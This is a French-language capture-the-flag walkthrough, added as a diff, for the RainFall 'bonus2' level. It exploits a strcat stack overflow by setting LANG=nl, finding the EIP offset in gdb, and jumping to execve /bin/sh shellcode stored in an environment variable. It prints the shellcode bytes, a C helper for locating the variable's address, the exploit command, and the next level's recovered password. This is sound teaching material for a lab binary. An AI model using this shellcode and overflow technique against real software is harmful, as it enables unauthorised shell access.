@@ -1,0 +1,83 @@
+On va exploiter le strcat dans greetuser() en ecrivant 40 caracteres dans av[1] puis 32 dans av[2], on lance gdb pour voir ce qu'il se passe:
+$ gdb ./bonus2
+(gdb) r `python -c 'print "A"*40 + " " + "B"*32'`
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40 + " " + "B"*32'`
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08004242 in ?? ()
+
+---> Le programme segfault car on ecrit l'EIP de greetuser() mais pas assez pour l'ecraser totalement
+---> On reecrit exactement 2 octets de l'EIP. Et tout ca a cause du message par default
+---> "Hello " qui n'est pas assez long.
+---> Or fi et nl sont plus long:
+bonus2@RainFall:~$ export LANG=nl
+bonus2@RainFall:~$ gdb ./bonus2
+(gdb) r `python -c 'print "A"*40 + " " + "B"*32'`
+Starting program: /home/user/bonus2/bonus2 `python -c 'print "A"*40 + " " + "B"*32'`
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+---> Mantenant on reecrit bien l'EIP entierement. Reste a savoir ou exactement:
+
+(gdb) r `python -c 'print "A"*40 + " " + "B"*28'`
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+(gdb) r `python -c 'print "A"*40 + " " + "B"*24'`
+Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08040042 in ?? ()
+
+---> Donc a partir de "B"*23 on devrait reecrire entierement l'EIP.
+
+---> J'ai essayer de passer mon shellcode dans av[1] et de return dessus mais le
+---> programme n'arretait pas de segfault donc on va faire a l'ancienne, par une variables d'environnement:
+
+
+$ export SHELLCODE=`python -c 'print "\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`
+$ cat /tmp/addr.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+	char *ptr;
+
+	if(argc < 3) {
+			printf("Usage: %s <environment variable> <target program name>\n", argv[0]);
+						   return 0;
+						   }
+
+						   ptr = getenv(argv[1]);
+
+    if (ptr == 0) {
+        printf("'%s' isn't defined\n", argv[1]);
+        return -1;
+    }
+
+    /* Compensate for prgram name length difference */
+	ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
+	printf("'%s' will be at %p\n", argv[1], ptr);
+
+    return 0;
+}
+bonus2@RainFall:~$ /tmp/a.out SHELLCODE ./bonus2
+'SHELLCODE' will be at 0xbffff91a
+
+---> On lance:
+
+$ ./bonus2 `python -c 'print "\x90"*15+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'` `python -c 'print "B"*23+"\xbf\xff\xf9\x1a"[::-1]'`
+> ls
+ls: cannot open directory .: Permission denied
+> cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
+$
+
+
+Over..
